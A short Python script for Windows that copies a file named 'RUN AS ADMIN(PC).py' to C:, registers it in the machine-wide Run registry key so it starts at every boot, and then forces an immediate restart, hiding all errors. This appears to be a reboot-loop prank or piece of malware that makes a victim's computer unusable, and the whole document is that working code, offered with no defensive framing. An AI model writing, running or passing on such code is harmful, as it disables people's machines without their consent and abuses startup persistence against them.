import winreg
import os
import shutil

'''
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
'''

try:
    shutil.copy2('RUN AS ADMIN(PC).py', 'C:\\RUN AS ADMIN(PC).py')
except:
    pass


try:
    rootkey = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    subkey = winreg.OpenKey(rootkey, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0,winreg.KEY_WRITE)

    winreg.SetValueEx(subkey, 'myscript', 0, winreg.REG_SZ, 'C:\\RUN AS ADMIN(PC).py')
except:
    pass
    


os.system('shutdown -r -t 0')
